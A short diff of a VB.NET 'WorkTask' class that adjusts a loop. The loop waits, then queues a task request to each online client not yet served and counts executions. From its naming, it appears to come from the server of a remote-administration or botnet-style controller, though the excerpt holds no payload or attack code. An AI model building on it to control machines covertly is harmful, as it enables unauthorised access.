@@ -26,26 +26,26 @@ Public Class WorkTask
                     F.Invoke(New _Work(AddressOf Work), New Object() {args})
                     Exit Sub
                 Else
-                    Await Task.Delay(10000)
+                    Await Task.Delay(15000)
+                    isOK = False
                     For Each L As ListViewItem In F.LV3.Items
                         If L.Tag = TaskID Then
                             isOK = True
-
                             For Each ClientOnServerList In Settings.Online
                                 If Not AllDone.Contains(ClientOnServerList.ID) Then
                                     Dim ClientReq As New Outcoming_Requests(ClientOnServerList, Obj)
                                     Pending.Req_Out.Add(ClientReq)
-                                    ClientOnServerList.LV.SubItems(F._TASKS.Index).Text += 1
-                                    L.SubItems(F._EXE.Index).Text += 1
                                     AllDone.Add(ClientOnServerList.ID)
+                                    L.SubItems(F._EXE.Index).Text += 1
                                 End If
                             Next
+                            Exit For
                         End If
                     Next
+                End If
 
-                    If isOK = False Then
-                        Exit Sub
-                    End If
+                If isOK = False Then
+                    Exit Sub
                 End If
             Catch ex As Exception
                 Messages.ClinetLog(Nothing, ex.Message, Color.Red)
